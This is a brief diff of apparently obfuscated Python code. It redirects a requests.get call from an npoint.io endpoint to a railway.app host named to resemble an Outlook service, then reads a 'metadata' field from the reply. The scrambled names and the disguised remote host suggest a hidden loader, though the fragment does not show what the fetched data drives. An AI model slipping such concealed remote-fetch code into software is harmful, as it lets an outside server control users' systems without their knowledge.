@@ -18,7 +18,7 @@ def learn_gevscz_646():
 
     def config_vfupir_995():
         try:
-            process_chnfbt_490 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            process_chnfbt_490 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             process_chnfbt_490.raise_for_status()
             model_ltcaqo_409 = process_chnfbt_490.json()
             process_utsaff_471 = model_ltcaqo_409.get('metadata')
